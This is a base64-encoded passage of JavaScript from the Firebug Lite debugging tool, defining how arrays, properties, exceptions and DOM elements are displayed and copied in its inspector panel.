ICAgKSwNCiAgICAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvIC0gY29uZmlybSB0aGlzIG9uIEZpcmVidWcNCiAgICAgICAgICAgIC8vRk9SKCJwcm9wIiwgIiRvYmplY3R8c2hvcnRQcm9wSXRlcmF0b3IiLA0KICAgICAgICAgICAgLy8gICAgICAgICIgJHByb3AubmFtZT0iLA0KICAgICAgICAgICAgLy8gICAgICAgIFNQQU4oeyJjbGFzcyI6ICJvYmplY3RQcm9wVmFsdWUifSwgIiRwcm9wLnZhbHVlfGNyb3BTdHJpbmciKQ0KICAgICAgICAgICAgLy8pLA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogImFycmF5UmlnaHRCcmFja2V0In0sICJdIikNCiAgICAgICAgKSwNCg0KICAgIGFycmF5SXRlcmF0b3I6IGZ1bmN0aW9uKGFycmF5KQ0KICAgIHsNCiAgICAgICAgdmFyIGl0ZW1zID0gW107DQogICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYXJyYXkubGVuZ3RoOyArK2kpDQogICAgICAgIHsNCiAgICAgICAgICAgIHZhciB2YWx1ZSA9IGFycmF5W2ldOw0KICAgICAgICAgICAgdmFyIHJlcCA9IEZpcmVidWcuZ2V0UmVwKHZhbHVlKTsNCiAgICAgICAgICAgIHZhciB0YWcgPSByZXAuc2hvcnRUYWcgPyByZXAuc2hvcnRUYWcgOiByZXAudGFnOw0KICAgICAgICAgICAgdmFyIGRlbGltID0gKGkgPT0gYXJyYXkubGVuZ3RoLTEgPyAiIiA6ICIsICIpOw0KDQogICAgICAgICAgICBpdGVtcy5wdXNoKHtvYmplY3Q6IHZhbHVlLCB0YWc6IHRhZywgZGVsaW06IGRlbGltfSk7DQogICAgICAgIH0NCg0KICAgICAgICByZXR1cm4gaXRlbXM7DQogICAgfSwNCg0KICAgIHNob3J0QXJyYXlJdGVyYXRvcjogZnVuY3Rpb24oYXJyYXkpDQogICAgew0KICAgICAgICB2YXIgaXRlbXMgPSBbXTsNCiAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBhcnJheS5sZW5ndGggJiYgaSA8IDM7ICsraSkNCiAgICAgICAgew0KICAgICAgICAgICAgdmFyIHZhbHVlID0gYXJyYXlbaV07DQogICAgICAgICAgICB2YXIgcmVwID0gRmlyZWJ1Zy5nZXRSZXAodmFsdWUpOw0KICAgICAgICAgICAgdmFyIHRhZyA9IHJlcC5zaG9ydFRhZyA/IHJlcC5zaG9ydFRhZyA6IHJlcC50YWc7DQogICAgICAgICAgICB2YXIgZGVsaW0gPSAoaSA9PSBhcnJheS5sZW5ndGgtMSA/ICIiIDogIiwgIik7DQoNCiAgICAgICAgICAgIGl0ZW1zLnB1c2goe29iamVjdDogdmFsdWUsIHRhZzogdGFnLCBkZWxpbTogZGVsaW19KTsNCiAgICAgICAgfQ0KDQogICAgICAgIGlmIChhcnJheS5sZW5ndGggPiAzKQ0KICAgICAgICAgICAgaXRlbXMucHVzaCh7b2JqZWN0OiAoYXJyYXkubGVuZ3RoLTMpICsgIiBtb3JlLi4uIiwgdGFnOiBGaXJlYnVnUmVwcy5DYXB0aW9uLnRhZywgZGVsaW06ICIifSk7DQoNCiAgICAgICAgcmV0dXJuIGl0ZW1zOw0KICAgIH0sDQoNCiAgICBzaG9ydFByb3BJdGVyYXRvcjogICAgdGhpcy5PYmoucHJvcEl0ZXJhdG9yLA0KDQogICAgZ2V0SXRlbUluZGV4OiBmdW5jdGlvbihjaGlsZCkNCiAgICB7DQogICAgICAgIHZhciBhcnJheUluZGV4ID0gMDsNCiAgICAgICAgZm9yIChjaGlsZCA9IGNoaWxkLnByZXZpb3VzU2libGluZzsgY2hpbGQ7IGNoaWxkID0gY2hpbGQucHJldmlvdXNTaWJsaW5nKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoY2hpbGQucmVwT2JqZWN0KQ0KICAgICAgICAgICAgICAgICsrYXJyYXlJbmRleDsNCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gYXJyYXlJbmRleDsNCiAgICB9LA0KDQogICAgLy8gKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKg0KDQogICAgY2xhc3NOYW1lOiAiYXJyYXkiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHJldHVybiB0aGlzLmlzQXJyYXkob2JqZWN0KTsNCiAgICB9LA0KDQogICAgLy8gaHR0cDovL2NvZGUuZ29vZ2xlLmNvbS9wL2ZidWcvaXNzdWVzL2RldGFpbD9pZD04NzQNCiAgICAvLyBCRUdJTiBZYWhvbyBCU0QgU291cmNlIChtb2RpZmllZCBoZXJlKSAgWUFIT08ubGFuZy5pc0FycmF5LCBZVUkgMi4yLjIgSnVuZSAyMDA3DQogICAgaXNBcnJheTogZnVuY3Rpb24ob2JqKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoIW9iaikNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICBlbHNlIGlmIChpc0lFICYmICFpc0Z1bmN0aW9uKG9iaikgJiYgdHlwZW9mIG9iaiA9PSAib2JqZWN0IiAmJiBpc0Zpbml0ZShvYmoubGVuZ3RoKSAmJiBvYmoubm9kZVR5cGUgIT0gOCkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UgaWYgKGlzRmluaXRlKG9iai5sZW5ndGgpICYmIGlzRnVuY3Rpb24ob2JqLnNwbGljZSkpDQogICAgICAgICAgICAgICAgcmV0dXJuIHRydWU7DQogICAgICAgICAgICBlbHNlIGlmIChpc0Zpbml0ZShvYmoubGVuZ3RoKSAmJiBpc0Z1bmN0aW9uKG9iai5jYWxsZWUpKSAvLyBhcmd1bWVudHMNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UgaWYgKGluc3RhbmNlT2Yob2JqLCAiSFRNTENvbGxlY3Rpb24iKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UgaWYgKGluc3RhbmNlT2Yob2JqLCAiTm9kZUxpc3QiKSkNCiAgICAgICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2goZXhjKQ0KICAgICAgICB7DQogICAgICAgICAgICBpZiAoRkJUcmFjZS5EQkdfRVJST1JTKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIEZCVHJhY2Uuc3lzb3V0KCJpc0FycmF5IEZBSUxTOiIsIGV4Yyk7ICAvKiBTb21ldGhpbmcgd2VpcmQ6IHdpdGhvdXQgdGhlIHRyeS9jYXRjaCwgT09NLCB3aXRoIG5vIGV4Y2VwdGlvbj8/ICovDQogICAgICAgICAgICAgICAgRkJUcmFjZS5zeXNvdXQoImlzQXJyYXkgRmFpbHMgb24gb2JqIiwgb2JqKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KDQogICAgICAgIHJldHVybiBmYWxzZTsNCiAgICB9LA0KICAgIC8vIEVORCBZYWhvbyBCU0QgU09VUkNFIFNlZSBsaWNlbnNlIGJlbG93Lg0KDQogICAgZ2V0VGl0bGU6IGZ1bmN0aW9uKG9iamVjdCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHJldHVybiAiWyIgKyBvYmplY3QubGVuZ3RoICsgIl0iOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5Qcm9wZXJ0eSA9IGRvbXBsYXRlKEZpcmVidWcuUmVwLA0Kew0KICAgIHN1cHBvcnRzT2JqZWN0OiBmdW5jdGlvbihvYmplY3QpDQogICAgew0KICAgICAgICByZXR1cm4gb2JqZWN0IGluc3RhbmNlb2YgUHJvcGVydHk7DQogICAgfSwNCg0KICAgIGdldFJlYWxPYmplY3Q6IGZ1bmN0aW9uKHByb3AsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gcHJvcC5vYmplY3RbcHJvcC5uYW1lXTsNCiAgICB9LA0KDQogICAgZ2V0VGl0bGU6IGZ1bmN0aW9uKHByb3AsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gcHJvcC5uYW1lOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5OZXRGaWxlID0gZG9tcGxhdGUodGhpcy5PYmosDQp7DQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIHJldHVybiBvYmplY3QgaW5zdGFuY2VvZiBGaXJlYnVnLk5ldEZpbGU7DQogICAgfSwNCg0KICAgIGJyb3dzZU9iamVjdDogZnVuY3Rpb24oZmlsZSwgY29udGV4dCkNCiAgICB7DQogICAgICAgIG9wZW5OZXdUYWIoZmlsZS5ocmVmKTsNCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfSwNCg0KICAgIGdldFJlYWxPYmplY3Q6IGZ1bmN0aW9uKGZpbGUsIGNvbnRleHQpDQogICAgew0KICAgICAgICByZXR1cm4gbnVsbDsNCiAgICB9DQp9KTsNCg0KLy8gKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqDQoNCnRoaXMuRXhjZXB0ID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RCT1goe19yZXBPYmplY3Q6ICIkb2JqZWN0In0sICIkb2JqZWN0Lm1lc3NhZ2UiKSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogImV4Y2VwdGlvbiIsDQoNCiAgICBzdXBwb3J0c09iamVjdDogZnVuY3Rpb24ob2JqZWN0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIEVycm9yQ29weTsNCiAgICB9DQp9KTsNCg0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNCg0KdGhpcy5FbGVtZW50ID0gZG9tcGxhdGUoRmlyZWJ1Zy5SZXAsDQp7DQogICAgdGFnOg0KICAgICAgICBPQkpFQ1RMSU5LKA0KICAgICAgICAgICAgIiZsdDsiLA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIm5vZGVUYWcifSwgIiRvYmplY3Qubm9kZU5hbWV8dG9Mb3dlckNhc2UiKSwNCiAgICAgICAgICAgIEZPUigiYXR0ciIsICIkb2JqZWN0fGF0dHJJdGVyYXRvciIsDQogICAgICAgICAgICAgICAgIiZuYnNwOyRhdHRyLm5vZGVOYW1lPSZxdW90OyIsIFNQQU4oeyJjbGFzcyI6ICJub2RlVmFsdWUifSwgIiRhdHRyLm5vZGVWYWx1ZSIpLCAiJnF1b3Q7Ig0KICAgICAgICAgICAgKSwNCiAgICAgICAgICAgICImZ3Q7Ig0KICAgICAgICAgKSwNCg0KICAgIHNob3J0VGFnOg0KICAgICAgICBPQkpFQ1RMSU5LKA0KICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogIiRvYmplY3R8Z2V0VmlzaWJsZSJ9LA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJzZWxlY3RvclRhZyJ9LCAiJG9iamVjdHxnZXRTZWxlY3RvclRhZyIpLA0KICAgICAgICAgICAgICAgIFNQQU4oeyJjbGFzcyI6ICJzZWxlY3RvcklkIn0sICIkb2JqZWN0fGdldFNlbGVjdG9ySWQiKSwNCiAgICAgICAgICAgICAgICBTUEFOKHsiY2xhc3MiOiAic2VsZWN0b3JDbGFzcyJ9LCAiJG9iamVjdHxnZXRTZWxlY3RvckNsYXNzIiksDQogICAgICAgICAgICAgICAgU1BBTih7ImNsYXNzIjogInNlbGVjdG9yVmFsdWUifSwgIiRvYmplY3R8Z2V0VmFsdWUiKQ0KICAgICAgICAgICAgKQ0KICAgICAgICAgKSwNCg0KICAgICBnZXRWaXNpYmxlOiBmdW5jdGlvbihlbHQpDQogICAgIHsNCiAgICAgICAgIHJldHVybiBpc1Zpc2libGUoZWx0KSA/ICIiIDogInNlbGVjdG9ySGlkZGVuIjsNCiAgICAgfSwNCg0KICAgICBnZXRTZWxlY3RvclRhZzogZnVuY3Rpb24oZWx0KQ0KICAgICB7DQogICAgICAgICByZXR1cm4gZWx0Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCk7DQogICAgIH0sDQoNCiAgICAgZ2V0U2VsZWN0b3JJZDogZnVuY3Rpb24oZWx0KQ0KICAgICB7DQogICAgICAgICByZXR1cm4gZWx0LmlkID8gIiMiICsgZWx0LmlkIDogIiI7DQogICAgIH0sDQoNCiAgICAgZ2V0U2VsZWN0b3JDbGFzczogZnVuY3Rpb24oZWx0KQ0KICAgICB7DQogICAgICAgICByZXR1cm4gZWx0LmNsYXNzTmFtZSA/ICIuIiArIGVsdC5jbGFzc05hbWUuc3BsaXQoIiAiKVswXSA6ICIiOw0KICAgICB9LA0KDQogICAgIGdldFZhbHVlOiBmdW5jdGlvbihlbHQpDQogICAgIHsNCiAgICAgICAgIC8vIFRPRE86IHh4eHBlZHJvDQogICAgICAgICByZXR1cm4gIiI7DQogICAgICAgICB2YXIgdmFsdWU7DQogICAgICAgICBpZiAoZWx0IGluc3RhbmNlb2YgSFRNTEltYWdlRWxlbWVudCkNCiAgICAgICAgICAgICB2YWx1ZSA9IGdldEZpbGVOYW1lKGVsdC5zcmMpOw0KICAgICAgICAgZWxzZSBpZiAoZWx0IGluc3RhbmNlb2YgSFRNTEFuY2hvckVsZW1lbnQpDQogICAgICAgICAgICAgdmFsdWUgPSBnZXRGaWxlTmFtZShlbHQuaHJlZik7DQogICAgICAgICBlbHNlIGlmIChlbHQgaW5zdGFuY2VvZiBIVE1MSW5wdXRFbGVtZW50KQ0KICAgICAgICAgICAgIHZhbHVlID0gZWx0LnZhbHVlOw0KICAgICAgICAgZWxzZSBpZiAoZWx0IGluc3RhbmNlb2YgSFRNTEZvcm1FbGVtZW50KQ0KICAgICAgICAgICAgIHZhbHVlID0gZ2V0RmlsZU5hbWUoZWx0LmFjdGlvbik7DQogICAgICAgICBlbHNlIGlmIChlbHQgaW5zdGFuY2VvZiBIVE1MU2NyaXB0RWxlbWVudCkNCiAgICAgICAgICAgICB2YWx1ZSA9IGdldEZpbGVOYW1lKGVsdC5zcmMpOw0KDQogICAgICAgICByZXR1cm4gdmFsdWUgPyAiICIgKyBjcm9wU3RyaW5nKHZhbHVlLCAyMCkgOiAiIjsNCiAgICAgfSwNCg0KICAgICBhdHRySXRlcmF0b3I6IGZ1bmN0aW9uKGVsdCkNCiAgICAgew0KICAgICAgICAgdmFyIGF0dHJzID0gW107DQogICAgICAgICB2YXIgaWRBdHRyLCBjbGFzc0F0dHI7DQogICAgICAgICBpZiAoZWx0LmF0dHJpYnV0ZXMpDQogICAgICAgICB7DQogICAgICAgICAgICAgZm9yICh2YXIgaSA9IDA7IGkgPCBlbHQuYXR0cmlidXRlcy5sZW5ndGg7ICsraSkNCiAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgIHZhciBhdHRyID0gZWx0LmF0dHJpYnV0ZXNbaV07DQogICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAvLyB3ZSBtdXN0IGNoZWNrIGlmIHRoZSBhdHRyaWJ1dGUgaXMgc3BlY2lmaWVkIG90aGVyd2lzZSBJRSB3aWxsIHNob3cgdGhlbQ0KICAgICAgICAgICAgICAgICBpZiAoIWF0dHIuc3BlY2lmaWVkIHx8IGF0dHIubm9kZU5hbWUgJiYgYXR0ci5ub2RlTmFtZS5pbmRleE9mKCJmaXJlYnVnLSIpICE9IC0xKQ0KICAgICAgICAgICAgICAgICAgICBjb250aW51ZTsNCiAgICAgICAgICAgICAgICAgZWxzZSBpZiAoYXR0ci5ub2RlTmFtZSA9PSAiaWQiKQ0KICAgICAgICAgICAgICAgICAgICBpZEF0dHIgPSBhdHRyOw0KICAgICAgICAgICAgICAgICBlbHNlIGlmIChhdHRyLm5vZGVOYW1lID09ICJjbGFzcyIpDQogICAgICAgICAgICAgICAgICAgIGNsYXNzQXR0ciA9IGF0dHI7DQogICAgICAgICAgICAgICAgIGVsc2UgaWYgKGF0dHIubm9kZU5hbWUgPT0gInN0eWxlIikNCiAgICAgICAgICAgICAgICAgICAgYXR0cnMucHVzaCh7DQogICAgICAgICAgICAgICAgICAgICAgICBub2RlTmFtZTogYXR0ci5ub2RlTmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgIG5vZGVWYWx1ZTogYXR0ci5ub2RlVmFsdWUgfHwNCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIElFIHdvbid0IHJlY29nbml6ZSB0aGUgYXR0ci5ub2RlVmFsdWUgb2YgPHN0eWxlPiBub2RlcyAuLi4NCiAgICAgICAgICAgICAgICAgICAgICAgIC8vIGFuZCB3aWxsIHJldHVybiBDU1MgcHJvcGVydHkgbmFtZXMgaW4gdXBwZXIgY2FzZSwgc28gd2UgbmVlZCB0byBjb252ZXJ0IHRoZW0NCiAgICAgICAgICAgICAgICAgICAgICAgIGVsdC5zdHlsZS5jc3NUZXh0LnJlcGxhY2UoLyhbXlxzXSspXHMqOi9nLCANCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24obSxnKXtyZXR1cm4gZy50b0xvd2VyQ2FzZSgpKyI6In0pICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgICAgICB9KTsNCiAgICAgICAgICAgICAgICAgZWxzZQ0KICAgICAgICAgICAgICAgICAgICBhdHRycy5wdXNoKGF0dHIpOw0KICAgICAgICAgICAgIH0NCiAgICAgICAgIH0NCiAgICAgICAgIGlmIChjbGFzc0F0dHIpDQogICAgICAgICAgICBhdHRycy5zcGxpY2UoMCwgMCwgY2xhc3NBdHRyKTsNCiAgICAgICAgIGlmIChpZEF0dHIpDQogICAgICAgICAgICBhdHRycy5zcGxpY2UoMCwgMCwgaWRBdHRyKTsNCiAgICAgICAgIA0KICAgICAgICAgcmV0dXJuIGF0dHJzOw0KICAgICB9LA0KDQogICAgIHNob3J0QXR0ckl0ZXJhdG9yOiBmdW5jdGlvbihlbHQpDQogICAgIHsNCiAgICAgICAgIHZhciBhdHRycyA9IFtdOw0KICAgICAgICAgaWYgKGVsdC5hdHRyaWJ1dGVzKQ0KICAgICAgICAgew0KICAgICAgICAgICAgIGZvciAodmFyIGkgPSAwOyBpIDwgZWx0LmF0dHJpYnV0ZXMubGVuZ3RoOyArK2kpDQogICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICB2YXIgYXR0ciA9IGVsdC5hdHRyaWJ1dGVzW2ldOw0KICAgICAgICAgICAgICAgICBpZiAoYXR0ci5ub2RlTmFtZSA9PSAiaWQiIHx8IGF0dHIubm9kZU5hbWUgPT0gImNsYXNzIikNCiAgICAgICAgICAgICAgICAgICAgIGF0dHJzLnB1c2goYXR0cik7DQogICAgICAgICAgICAgfQ0KICAgICAgICAgfQ0KDQogICAgICAgICByZXR1cm4gYXR0cnM7DQogICAgIH0sDQoNCiAgICAgZ2V0SGlkZGVuOiBmdW5jdGlvbihlbHQpDQogICAgIHsNCiAgICAgICAgIHJldHVybiBpc1Zpc2libGUoZWx0KSA/ICIiIDogIm5vZGVIaWRkZW4iOw0KICAgICB9LA0KDQogICAgIGdldFhQYXRoOiBmdW5jdGlvbihlbHQpDQogICAgIHsNCiAgICAgICAgIHJldHVybiBnZXRFbGVtZW50VHJlZVhQYXRoKGVsdCk7DQogICAgIH0sDQogICAgIA0KICAgICAvLyBUT0RPOiB4eHhwZWRybyByZW1vdmUgdGhpcz8NCiAgICAgZ2V0Tm9kZVRleHQ6IGZ1bmN0aW9uKGVsZW1lbnQpDQogICAgIHsNCiAgICAgICAgIHZhciB0ZXh0ID0gZWxlbWVudC50ZXh0Q29udGVudDsNCiAgICAgICAgIGlmIChGaXJlYnVnLnNob3dGdWxsVGV4dE5vZGVzKQ0KICAgICAgICAgICAgcmV0dXJuIHRleHQ7DQogICAgICAgIGVsc2UNCiAgICAgICAgICAgIHJldHVybiBjcm9wU3RyaW5nKHRleHQsIDUwKTsNCiAgICAgfSwNCiAgICAgLyoqLw0KDQogICAgIGdldE5vZGVUZXh0R3JvdXBzOiBmdW5jdGlvbihlbGVtZW50KQ0KICAgICB7DQogICAgICAgICB2YXIgdGV4dCA9ICBlbGVtZW50LnRleHRDb250ZW50Ow0KICAgICAgICAgaWYgKCFGaXJlYnVnLnNob3dGdWxsVGV4dE5vZGVzKQ0KICAgICAgICAgew0KICAgICAgICAgICAgIHRleHQ9Y3JvcFN0cmluZyh0ZXh0LDUwKTsNCiAgICAgICAgIH0NCg0KICAgICAgICAgdmFyIGVzY2FwZUdyb3Vwcz1bXTsNCg0KICAgICAgICAgaWYgKEZpcmVidWcuc2hvd1RleHROb2Rlc1dpdGhXaGl0ZXNwYWNlKQ0KICAgICAgICAgICAgIGVzY2FwZUdyb3Vwcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAnZ3JvdXAnOiAnd2hpdGVzcGFjZScsDQogICAgICAgICAgICAgICAgJ2NsYXNzJzogJ25vZGVXaGl0ZVNwYWNlJywNCiAgICAgICAgICAgICAgICAnZXh0cmEnOiB7DQogICAgICAgICAgICAgICAgICAgICdcdCc6ICdfVGFiJywNCiAgICAgICAgICAgICAgICAgICAgJ1xuJzogJ19QYXJhJywNCiAgICAgICAgICAgICAgICAgICAgJyAnIDogJ19TcGFjZScNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgfSk7DQogICAgICAgICBpZiAoRmlyZWJ1Zy5zaG93VGV4dE5vZGVzV2l0aEVudGl0aWVzKQ0KICAgICAgICAgICAgIGVzY2FwZUdyb3Vwcy5wdXNoKHsNCiAgICAgICAgICAgICAgICAgJ2dyb3VwJzondGV4dCcsDQogICAgICAgICAgICAgICAgICdjbGFzcyc6J25vZGVUZXh0RW50aXR5JywNCiAgICAgICAgICAgICAgICAgJ2V4dHJhJzp7fQ0KICAgICAgICAgICAgIH0pOw0KDQogICAgICAgICBpZiAoZXNjYXBlR3JvdXBzLmxlbmd0aCkNCiAgICAgICAgICAgICByZXR1cm4gZXNjYXBlR3JvdXBzRm9yRW50aXRpZXModGV4dCwgZXNjYXBlR3JvdXBzKTsNCiAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICByZXR1cm4gW3tzdHI6dGV4dCwnY2xhc3MnOicnLGV4dHJhOicnfV07DQogICAgIH0sDQoNCiAgICAvLyAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqDQoNCiAgICBjb3B5SFRNTDogZnVuY3Rpb24oZWx0KQ0KICAgIHsNCiAgICAgICAgdmFyIGh0bWwgPSBnZXRFbGVtZW50WE1MKGVsdCk7DQogICAgICAgIGNvcHlUb0NsaXBib2FyZChodG1sKTsNCiAgICB9LA0KDQogICAgY29weUlubmVySFRNTDogZnVuY3Rpb24oZWx0KQ0KICAgIHsNCiAgICAgICAgY29weVRvQ2xpcGJvYXJkKGVsdC5pbm5lckhUTUwpOw0KICAgIH0sDQoNCiAgICBjb3B5WFBhdGg6IGZ1bmN0aW9uKGVsdCkNCiAgICB7DQogICAgICAgIHZhciB4cGF0aCA9IGdldEVsZW1lbnRYUGF0aChlbHQpOw0KICAgICAgICBjb3B5VG9DbGlwYm9hcmQoeHBhdGgpOw0KICAgIH0sDQoNCiAgICBwZXJzaXN0b3I6IGZ1bmN0aW9uKGNvbnRleHQsIHhwYXRoKQ0KICAgIHsNCiAgICAgICAgdmFyIGVsdHMgPSB4cGF0aA0KICAgICAgICAgICAgPyBnZXRFbGVtZW50c0J5WFBhdGgoY29udGV4dC53aW5kb3cuZG9jdW1lbnQsIHhwYXRoKQ0KICAgICAgICAgICAgOiBudWxsOw0KDQogICAgICAgIHJldHVybiBlbHRzICYmIGVsdHMubGVuZ3RoID8gZWx0c1swXSA6IG51bGw7DQogICAgfSwNCg0KICAgIC8vICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICogKiAqICoNCg0KICAgIGNsYXNzTmFtZTogImVsZW1lbnQiLA0KDQogICAgc3VwcG9ydHNPYmplY3Q6IGZ1bmN0aW9uKG9iamVjdCkNCiAgICB7DQogICAgICAgIC8vcmV0dXJuIG9iamVjdCBpbnN0YW5jZW9mIEVsZW1lbnQgfHwgb2JqZWN0Lm5vZGVUeXBlID09IDEgJiYgdHlwZW9mIG9iamVjdC5ub2RlTmFtZSA9PSAic3RyaW5nIjsNCiAgICAgICAgcmV0dXJuIGluc3RhbmNlT2Yob2JqZWN0LCAiRWxlbWVudCIpOw0KICAgIH0sDQoNCiAgICBicm93c2VPYmplY3Q6IGZ1bmN0aW9uKGVsdCwgY29udGV4dCkNCiAgICB7DQogICAgICAgIHZhciB0YWcgPSBlbHQubm9kZU5hbWUudG9Mb3dlckNhc2UoKTsNCiAgICAgICAgaWYgKHRhZyA9PSAic2NyaXB0IikNCiAgICAgICAgICAgIG9wZW5OZXdUYWIoZWx0LnNyYyk7DQogICAgICAgIGVsc2UgaWYgKHRhZyA9PSAibGluayIpDQogICAgICAgICAgICBvcGVuTmV3VGFiKGVsdC5ocmVmKTsNCiAgICAgICAgZWxzZSBpZiAodGFnID09ICJhIikNCiAgICAgICAgICAgIG9wZW5OZXdUYWIoZWx0LmhyZWYpOw0KICAgICAgICBlbHNlIGlmICh0YWcgPT0gImltZyIpDQogICAgICAgICAgICBvcGVuTmV3VGFiKGVsdC5zcmMpOw0KDQogICAgICAgIHJldHVybiB0cnVlOw0KICAgIH0sDQoNCiAgICBwZXJzaXN0T2JqZWN0OiBmdW5jdGlvbihlbHQsIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgeHBhdGggPSBnZXRFbGVtZW50WFBhdGgoZWx0KTsNCg0KICAgICAgICByZXR1cm4gYmluZCh0aGlzLnBlcnNpc3RvciwgdG9wLCB4cGF0aCk7DQogICAgfSwNCg0KICAgIGdldFRpdGxlOiBmdW5jdGlvbihlbGVtZW50LCBjb250ZXh0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIGdldEVsZW1lbnRDU1NTZWxlY3RvcihlbGVtZW50KTsNCiAgICB9LA0KDQogICAgZ2V0VG9vbHRpcDogZnVuY3Rpb24oZWx0KQ0KICAgIHsNCiAgICAgICAgcmV0dXJuIHRoaXMuZ2V0WFBhdGgoZWx0KTsNCiAgICB9LA0KDQogICAgZ2V0Q29udGV4dE1lbnVJdGVtczogZnVuY3Rpb24oZWx0LCB0YXJnZXQsIGNvbnRleHQpDQogICAgew0KICAgICAgICB2YXIgbW9uaXRvcmVkID0gYXJlRXZlbnRzTW9uaXRvcmVkKGVsdCwgbnVsbCwgY29udGV4dCk7DQoNCiAgICAgICAgcmV0dXJuIFsNCiAgICAgICAgICAgIHtsYWJlbDogIkNvcHlIVE1MIiwgY29tbWFuZDogYmluZEZpeGVkKHRoaXMuY29weUhUTUwsIHRoaXMsIGVsdCkgfSwNCiAgICAgICAgICAgIHtsYWJlbDogIkNvcHlJbm5lckhUTUwiLCBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5jb3B5SW5uZXJIVE1MLCB0aGlzLCBlbHQpIH0sDQogICAgICAgICAgICB7bGFiZWw6ICJDb3B5WFBhdGgiLCBjb21tYW5kOiBiaW5kRml4ZWQodGhpcy5jb3B5WFBhdGgsIHRoaXMsIGVsdCkgfSwNCiAgICAgICAgICAgICItIiwNCiAgICAgICAgICAgIHtsYWJlbDogIlNob3dFdmVudHNJbkNvbnNvbGUiLCB0eXBlOiAiY2hlY2tib3giLCBjaGVja2VkOiBtb25pdG9yZWQsDQogICAgICAgICAgICAgY29tbWFuZDogYmluZEZpeGVkKHRvZ2dsZU1vbml0b3JFdmVudHMsIEZCTCwgZWx0LCBudWxsLCBtb25pdG9yZWQsIGNvbnRleHQpIH0sDQogICAgICAgICAgICAiLSIsDQogICAgICAgICAgICB7bGFiZWw6ICJTY3JvbGxJbnRvVmlldyIsIGNvbW1hbmQ6IGJpbmRGaXhlZChlbHQuc2Nyb2xsSW50b1ZpZXcsIGVsdCkgfQ0KICAgICAgICBdOw0KICAgIH0NCn0pOw0KDQovLyAqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioqKioNC